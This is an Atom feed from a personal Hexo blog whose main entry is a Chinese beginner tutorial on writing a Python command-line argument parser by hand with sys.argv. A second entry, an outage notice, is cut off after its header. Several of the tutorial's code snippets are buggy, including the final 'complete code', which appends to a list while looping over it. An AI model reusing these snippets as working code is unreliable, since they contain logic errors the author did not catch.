<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xiaoming&#39;s Blog</title>
  
  <subtitle>知行合一，厚德载物。</subtitle>
  <link href="https://meinming.github.io/atom.xml" rel="self"/>
  
  <link href="https://meinming.github.io/"/>
  <updated>2022-09-08T05:17:31.000Z</updated>
  <id>https://meinming.github.io/</id>
  
  <author>
    <name>Muller. ming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python编写第一个cli程序（一）:自己写一个参数解析</title>
    <link href="https://meinming.github.io/posts/8448023d/"/>
    <id>https://meinming.github.io/posts/8448023d/</id>
    <published>2022-09-08T05:17:31.000Z</published>
    <updated>2022-09-08T05:17:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>起因：最近我在用Python做了一个随机大小写的脚本，由于第一次涉及命令行程序的编写，走了很多弯路，并没有使用 argparse 的这样nb的第三方库，就自己撸了一个参数解析，好在最后完成了！</em></p><p>项目地址：<a href="https://github.com/surrtr/up-low-letter">up-low-letter</a></p><p>如果喜欢喵，给个star吧喵（战术去世.jpg）</p><p>注意：本人对Python的理解不深，这次刚完成一个项目，感想颇多，写一个文章总结一下做个笔记，方便以后复习，如果出现错误，<strong>大佬请轻喷</strong>，欢迎在评论区指正，谢谢！</p><p><strong>可以argparse这样的大的第三方库，不用这样搞。这里是因为走了弯路，就把思路写出来了</strong></p><p><font color="red">如果你正在学argparse等高级东西，请绕行，这篇文章在浪费你的时间</font></p><h2 id="argv的使用"><a href="#argv的使用" class="headerlink" title="argv的使用"></a>argv的使用</h2><p><strong>大佬可以直接跳到下一段落</strong></p><p>sys模块是与python解释器交互的一个接口。sys 模块提供了许多函数和变量来处理 Python 运行时环境的不同部分。</p><p>首先，请导入模块（废话）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure><p>在python脚本被执行的时候，sys.argv列表中就会存着运行时的参数，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;test.py&#x27;,&#x27;arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;]</span><br></pre></td></tr></table></figure><p>由此观之：</p><p>sys.argv[0] 表示程序自身的名称<br>sys.argv[1] 表示程序的第一个参数<br>sys.argv[2] 表示程序的第二个参数</p><p>网上流传过这样一个事：</p><p>一个用爱发电的免费加速器作者，发现有奸商把他的软件加了壳去某宝上卖，他把软件加壳、资源混淆搞了一路十三招，还是有人拿去卖，最后没有办法直接连文件名改掉都不让运行。在这里，我们也可以达到这样的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">0</span>] != <span class="string">&#x27;test.py&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;你下到假传奇了：<span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>) <span class="comment"># 终止程序</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;恭喜你，你下到了真传奇：<span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;汤碗拦月loding......&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;大扎好，我系轱天乐，我四渣渣辉，汤碗拦月，介四里没有挽过的船新版本，挤需体验三番钟，里造会干我一样，爱象节款游戏。&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">------------名字为test.py------------</span><br><span class="line">$ python test.py</span><br><span class="line">恭喜你，你下到了真传奇：test.py</span><br><span class="line">汤碗拦月loding......</span><br><span class="line">大扎好，我系轱天乐，我四渣渣辉，汤碗拦月，介四里没有挽过的船新版本，挤需体验三番钟，里造会干我一样，爱象节款游戏。</span><br><span class="line">------------名字为flase.py------------</span><br><span class="line">$ <span class="built_in">mv</span> test.py flase.py <span class="comment">#linux的移动命令，这里在改名</span></span><br><span class="line">$ python flase.py</span><br><span class="line">你下到假传奇了：flase.py</span><br></pre></td></tr></table></figure><p><em>好样的，我们已经帮助用户判断是否他的传奇是真传奇了，是不是成就感满满？（逃）</em></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>我们现在已经初步了解了argv的用法了，现在开始实战：</p><p>我们要做一个类似<code>cat</code>命令的功能，预计的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line">$ python cat.py flag.txt</span><br><span class="line">Hi,here！</span><br><span class="line">There is<span class="string">&#x27;t a flag,Find it in the folder root</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>从输出可以看出，程序直接读取运行脚本时的第一个参数（继文件名的第一个参数，sys.argv的第二个参数）作为路径读取文件并输出</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">path = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cont = f.read()</span><br><span class="line"><span class="built_in">print</span>(cont)</span><br></pre></td></tr></table></figure><h2 id="使用argv来枚举"><a href="#使用argv来枚举" class="headerlink" title="使用argv来枚举"></a>使用argv来枚举</h2><p>我们得到了argv这个大杀器，现在我们可以搞点事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethelp</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;帮助信息\nNO INFO&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example1</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex1:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example2</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex2:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    gethelp()</span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">&#x27;-h&#x27;</span>:</span><br><span class="line">    gethelp() <span class="comment">#获取帮助，需要在前面定义函数</span></span><br><span class="line"><span class="keyword">elif</span> target == <span class="string">&#x27;-ex1&#x27;</span>:</span><br><span class="line">    example1(sys.argv[<span class="number">2</span>]) <span class="comment">#同样是前面定义的函数，传入参数为命令的第二个参数</span></span><br><span class="line"><span class="keyword">elif</span> target == <span class="string">&#x27;-ex2&#x27;</span>:</span><br><span class="line">    example2(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果你想写全称，就这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethelp</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;帮助信息\nNO INFO&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example1</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex1:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example2</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex2:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    gethelp()</span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">&#x27;-h&#x27;</span> <span class="keyword">or</span> target == <span class="string">&#x27;--help&#x27;</span>:</span><br><span class="line">    gethelp() <span class="comment">#获取帮助，需要在前面定义函数</span></span><br><span class="line"><span class="keyword">elif</span> target == <span class="string">&#x27;-ex1&#x27;</span> <span class="keyword">or</span> target == <span class="string">&#x27;--example1&#x27;</span>:</span><br><span class="line">    example1(sys.argv[<span class="number">2</span>]) <span class="comment">#同样是前面定义的函数，传入参数为命令的第二个参数</span></span><br><span class="line"><span class="keyword">elif</span> target == <span class="string">&#x27;-ex2&#x27;</span> <span class="keyword">or</span> target == <span class="string">&#x27;--example2&#x27;</span>:</span><br><span class="line">    example2(sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那看起来很棒，但会出现问题：</p><ul><li><p>如果你的参数并没有出现在第一的位置，她将报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python a.py unknown -ex1 114514</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No such parm:unknow</span><br></pre></td></tr></table></figure><p>她不会运行，她告诉了使用者出现的问题，但我们希望她忽视这段字符</p></li><li><p>加入二级参数的判断十分冗杂</p><p>我的项目的<code>v1.0.2</code>版本中加入了<code>-o</code>的参数，我对此犯了难，她的实现将会需要可能的if嵌套，那会使我的代码变得晦涩难懂。最后通过在完成转换后进行判断是否输出才勉强不完美地解决问题。</p><p>相关的issues：<a href="https://github.com/surrtr/up-low-letter/issues/6">Target中的逻辑错误 · Issue #6 · surrtr/up-low-letter (github.com)</a></p></li></ul><h3 id="那怎么办？"><a href="#那怎么办？" class="headerlink" title="那怎么办？"></a>那怎么办？</h3><p>我们尝试使用枚举的方式解决问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        key.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    n = sys.argv.index(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;-h&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--help&#x27;</span>:</span><br><span class="line">        gethelp() <span class="comment">#获取帮助，需要在前面定义函数</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;-ex1&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--example1&#x27;</span>:</span><br><span class="line">        example1(sys.argv[n+<span class="number">1</span>]) <span class="comment">#同样是前面定义的函数，传入参数为命令的第二个参数</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;-ex2&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--example2&#x27;</span>:</span><br><span class="line">        example2(sys.argv[n+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>继续优化，把参数放到key_list里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key_list =&#123;</span><br><span class="line">    <span class="string">&quot;-ex1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;--example1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;-ex2&quot;</span>: example2,</span><br><span class="line">    <span class="string">&quot;--example2&quot;</span>: example2,</span><br><span class="line">&#125;</span><br><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        key.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    n = sys.argv.index(i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;-h&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--help&#x27;</span>:</span><br><span class="line">        gethelp()</span><br><span class="line">    <span class="keyword">elif</span> i <span class="keyword">in</span> key_list:</span><br><span class="line">        key_list[i](sys.argv[n+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么，有人就会问了：为什么把help单独提出来放到前面？那是因为直接放到key_list里，会出现访问下标越界。</p><p>当无附加参数的参数（不知道术语）较多的时候，也可以单独列个字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">key_list_0 =&#123;</span><br><span class="line">    <span class="string">&quot;-h&quot;</span>: gethelp,</span><br><span class="line">    <span class="string">&quot;--help&quot;</span>: gethelp,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key_list_1 =&#123;</span><br><span class="line">    <span class="string">&quot;-ex1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;--example1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;-ex2&quot;</span>: example2,</span><br><span class="line">    <span class="string">&quot;--example2&quot;</span>: example2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        k = target.index(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    n = sys.argv.index(i)</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> key_list_0:</span><br><span class="line">        key_list_0[i]()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i <span class="keyword">in</span> key_list_1:</span><br><span class="line">        key_list_1[i](sys.argv[n+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当需要可选参数时,可以使用布尔值来确定是有调用可选参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">key_list_0 =&#123;</span><br><span class="line">    <span class="string">&quot;-h&quot;</span>: gethelp,</span><br><span class="line">    <span class="string">&quot;--help&quot;</span>: gethelp,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key_list_1 =&#123;</span><br><span class="line">    <span class="string">&quot;-ex1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;--example1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;-ex2&quot;</span>: example2,</span><br><span class="line">    <span class="string">&quot;--example2&quot;</span>: example2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ex3 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        k = target.index(i)</span><br><span class="line">        key.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    n = sys.argv.index(i)</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> key_list_0:</span><br><span class="line">        key_list_0[i]()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> key_list_1:</span><br><span class="line">        key_list_1[i](sys.argv[n+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;-ex3&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--example3&#x27;</span>:</span><br><span class="line">        ex3 == <span class="literal">True</span></span><br><span class="line">        ex3_i = n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> ex3:</span><br><span class="line">    example3(sys.argv[ex3_i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>这样，在调用<code>-ex3</code>和<code>--example3</code>时，将会运行<code>example3</code>方法，不使用也不会报错</p><p>这里可能会出现问题：当只使用可选参数时，她将出现问题，我们这里给她做一个排除:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key = []</span><br><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        key.append(i)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">&#x27;-o&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:不可只调用可选参数&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>) </span><br></pre></td></tr></table></figure><p>也可以继续优化，将可选参数列为一个字典，但我并未使用到，就不作提及了。</p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethelp</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;帮助信息\nNO INFO&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example1</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex1:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example2</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ex2:<span class="subst">&#123;parm&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example3</span>(<span class="params">parm</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n我是可选参数,ex3:<span class="subst">&#123;parm&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key_list_0 =&#123;</span><br><span class="line">    <span class="string">&quot;-h&quot;</span>: gethelp,</span><br><span class="line">    <span class="string">&quot;--help&quot;</span>: gethelp,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key_list_1 =&#123;</span><br><span class="line">    <span class="string">&quot;-ex1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;--example1&quot;</span>: example1,</span><br><span class="line">    <span class="string">&quot;-ex2&quot;</span>: example2,</span><br><span class="line">    <span class="string">&quot;--example2&quot;</span>: example2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    gethelp()</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">ex3 = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        key.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    n = sys.argv.index(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i.startswith(<span class="string">&quot;-&quot;</span>):</span><br><span class="line">        key.append(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; <span class="number">2</span> <span class="keyword">and</span> <span class="string">&#x27;-ex3&#x27;</span> <span class="keyword">in</span> key:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:不可只调用可选参数&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> key_list_0:</span><br><span class="line">        key_list_0[i]()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i <span class="keyword">in</span> key_list_1:</span><br><span class="line">        key_list_1[i](sys.argv[n+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;-ex3&#x27;</span> <span class="keyword">or</span> i == <span class="string">&#x27;--example3&#x27;</span>:</span><br><span class="line">        ex3 = <span class="literal">True</span></span><br><span class="line">        ex3_i = n</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;No such parm:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ex3:</span><br><span class="line">    example3(sys.argv[ex3_i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><font color="red">不如第三方库，学学思路就行了</font>，不如argparse。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;起因：最近我在用Python做了一个随机大小写的脚本，由于第一次涉及命令行程序的编写，走了很多弯路，并没有使用 argparse 的这样nb的第三方库，就自己撸了一个参数解析，好在最后完成了！&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://gi</summary>
      
    
    
    
    <category term="Python" scheme="https://meinming.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://meinming.github.io/tags/Python/"/>
    
    <category term="学习笔记" scheme="https://meinming.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="cli" scheme="https://meinming.github.io/tags/cli/"/>
    
  </entry>
  
  <entry>
    <title>公告：vercel她炸了，我们也跟着炸了</title>
    <link href="https://meinming.github.io/posts/9dca6c72/"/>
    <id>https://meinming.github.io/posts/9dca6c72/</id>
    <published>2022-09-02T00:19:45.000Z</published>
    <updated>2022-09-01T01:15:47.000Z</updated>
    
